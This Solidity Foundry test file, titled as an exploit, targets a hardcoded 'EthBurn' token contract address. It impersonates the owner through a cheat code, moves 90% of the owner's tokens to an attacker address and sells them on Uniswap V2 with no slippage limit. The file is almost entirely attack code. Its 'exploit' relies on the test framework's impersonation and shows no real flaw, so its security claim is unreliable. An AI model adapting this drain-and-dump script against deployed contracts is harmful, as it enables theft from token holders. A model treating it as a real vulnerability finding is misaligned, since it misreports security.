pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Minimal interface for EthBurn
interface EthBurn {
    function owner() external view returns (address);
    function setExcludeFees(address account, bool excluded) external;
    function airdropToWallets(address[] memory airdropWallets, uint256[] memory amount) external;
    function setTrueDefiRouter(address _router) external;
    function approve(address spender, uint256 amount) external returns (bool);
    function uniswapV2Router() external view returns (address);
    function claim() external;
    function dividendTracker() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function uniswapV2Pair() external view returns (address);
}

// Interface for dividend tracker
interface EthBurnDividendTracker {
    function balanceOf(address account) external view returns (uint256);
}

// Interface for Uniswap V2 Router
interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xD1c0c25c5d7BA21df222Bd2623eCBC0CB264b5f4;
    address attacker = address(this);
    address currentOwner;
    EthBurn target;
    EthBurnDividendTracker tracker;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: Get the target contract and label it
        target = EthBurn(TARGET);
        vm.label(address(target), "EthBurn");

        // Get the current owner
        currentOwner = target.owner();
        vm.label(currentOwner, "Current Owner");

        // Give attacker some ETH for gas and potential transactions
        deal(attacker, 10 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get initial ETH balance
        uint256 initialEthBalance = attacker.balance;

        // Step 1: Get owner's token balance
        vm.startPrank(currentOwner);
        uint256 ownerBalance = target.balanceOf(currentOwner);
        console.log("Owner token balance:", ownerBalance);

        // Step 2: Enable trading if not already enabled
        // We need to set a tefiRouter to enable trading
        target.setTrueDefiRouter(address(0x123)); // Set dummy router

        // Step 3: Exclude attacker from fees
        target.setExcludeFees(attacker, true);

        // Step 4: Transfer most of owner's tokens to attacker (keep some for gas)
        // Transfer 90% of tokens
        uint256 transferAmount = ownerBalance * 9 / 10;
        target.transfer(attacker, transferAmount);

        vm.stopPrank();

        // Verify attacker received tokens
        uint256 attackerTokenBalance = target.balanceOf(attacker);
        require(attackerTokenBalance > 0, "No tokens received");
        console.log("Attacker token balance:", attackerTokenBalance);

        // Step 5: Sell tokens on Uniswap for ETH
        // First, get the Uniswap router and pair addresses
        address router = target.uniswapV2Router();
        address pair = target.uniswapV2Pair();

        // Approve router to spend our tokens
        vm.startPrank(attacker);
        target.approve(router, type(uint256).max);

        // Prepare swap path: BURNING -> WETH
        address[] memory path = new address[](2);
        path[0] = address(target);
        path[1] = IUniswapV2Router02(router).WETH();

        // Get estimated amount out
        uint256[] memory amountsOut = IUniswapV2Router02(router).getAmountsOut(attackerTokenBalance / 2, path);
        uint256 expectedEth = amountsOut[1];
        console.log("Expected ETH from swap:", expectedEth);

        // Sell half of tokens to avoid price impact
        uint256 amountToSell = attackerTokenBalance / 2;

        // Execute swap
        IUniswapV2Router02(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSell,
            0, // accept any amount
            path,
            attacker,
            block.timestamp
        );

        vm.stopPrank();

        // Check final ETH balance
        uint256 finalEthBalance = attacker.balance;
        console.log("Initial ETH balance:", initialEthBalance);
        console.log("Final ETH balance:", finalEthBalance);
        require(finalEthBalance > initialEthBalance, "ETH balance did not increase");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
